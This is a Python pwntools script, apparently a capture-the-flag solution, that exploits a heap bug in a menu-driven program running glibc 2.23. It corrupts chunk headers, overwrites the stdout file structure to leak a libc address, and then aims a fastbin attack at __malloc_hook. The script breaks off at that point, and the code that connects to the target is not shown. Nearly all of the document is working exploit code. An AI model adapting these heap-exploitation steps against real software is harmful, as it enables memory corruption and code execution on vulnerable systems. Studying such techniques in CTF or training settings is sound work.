from pwn import *
context.log_level='debug'
libc = ELF('/home/bit/libc/64bit/libc-2.23.so')
    
def add(size,index,name):
    io.sendlineafter('choice >>','1')
    io.sendlineafter('skills: ',str(size))
    io.sendlineafter('index: ',str(index))
    io.sendafter('name:',name)
def free(index):
    io.sendlineafter('choice >>','2')
    io.sendlineafter('idx :',str(index))
def edit(index,payload):
    io.sendlineafter('choice >>','3')
    io.sendlineafter('idx: ',str(index))
    io.sendafter('content:',payload)
    
def exploit():
    add(0x58,0,'a'*0x48+p64(0x61))
    add(0x60,1,'a')
    add(0x18,2,'a')
    add(0x58,3,'a')
    free(1)
    free(3)
    free(0)
    edit(0,p8(0x50))
    add(0x58,4,'a')
    add(0x58,5,'a'*8+p64(0x91))
    free(1)
    edit(1,p16(0xa5dd))
    edit(5,'a'*8+p64(0x71))
    add(0x60,6,'a')
    add(0x60,7,'\0'*0x33+p64(0xfbad1887)+p64(0)*3+'\0')
    libc_base = u64(io.recvuntil('\x7f',timeout=0.5)[-6:]+'\0\0')-0x3c5600
    success('libc_base:'+hex(libc_base))
    free(1)
    edit(1,p64(libc_base + libc.sym['__malloc_hook']-0x23))
    add(0x60,1,'a')
